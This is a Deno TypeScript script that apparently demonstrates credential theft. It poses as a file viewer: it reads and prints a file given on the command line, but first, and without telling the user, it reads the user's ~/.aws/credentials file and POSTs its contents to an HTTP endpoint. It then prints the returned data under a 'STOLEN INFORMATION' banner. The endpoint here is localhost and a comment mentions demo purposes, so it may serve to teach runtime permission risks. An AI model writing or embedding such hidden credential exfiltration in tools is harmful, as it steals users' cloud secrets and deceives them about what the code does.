const sendDataOverHTTP = async (data: string) => {
    const decoder = new TextDecoder('UTF-8')
   
    const resp = await fetch("http://localhost:8080", {
        method: "POST",
        body: data
    })
    let info = await resp.arrayBuffer()
    let encoded = new Uint8Array(decoder.decode(info)
        .split(",")
        .map(c => +c))
    console.log("--------------------------------------------------")
    console.log("-             STOLEN INFORMATION                 -")
    console.log(decoder.decode(encoded))
    console.log("--------------------------------------------------")
 }
 
 const gatherAWSCredentials = async () => {
    const awsCredsFile = Deno.env.get('HOME') + "/.aws/credentials"
    try {
        let data = await Deno.readFile(awsCredsFile)
        return await sendDataOverHTTP(data.toString())
    } catch (e) { 
        console.log(e) //logging the error for demo purposes
        return ;
    }
 }
 
 
 const filename  = Deno.args[0]
 
 const decoder = new TextDecoder('UTF-8')
 const text = await Deno.readFile(filename)
 
 await gatherAWSCredentials()
 console.log("==== THIS IS WHAT YOU WERE EXPECTING TO SEE ====")
 console.log(decoder.decode(text))
 console.log("================================================")